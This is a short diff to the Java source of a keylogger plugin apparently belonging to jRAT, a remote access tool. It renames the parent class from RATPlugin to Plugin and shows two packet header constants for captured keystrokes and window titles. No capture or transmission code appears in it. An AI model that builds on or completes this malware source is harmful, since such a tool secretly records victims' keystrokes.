@@ -1,13 +1,13 @@
 package se.jrat.plugin.keylogger.client;
 
 import iconlib.IconUtils;
-import jrat.api.RATPlugin;
+import jrat.api.Plugin;
 import jrat.api.net.Packet;
 import jrat.api.ui.RATControlMenuEntry;
 import jrat.api.ui.RATMenuItem;
 import se.jrat.plugin.keylogger.client.ui.PanelKeylogger;
 
-public class KeyloggerPlugin extends RATPlugin {
+public class KeyloggerPlugin extends Plugin {
 
 	public static final byte KEY_HEADER = 121;
 	public static final byte TITLE_HEADER = 122;
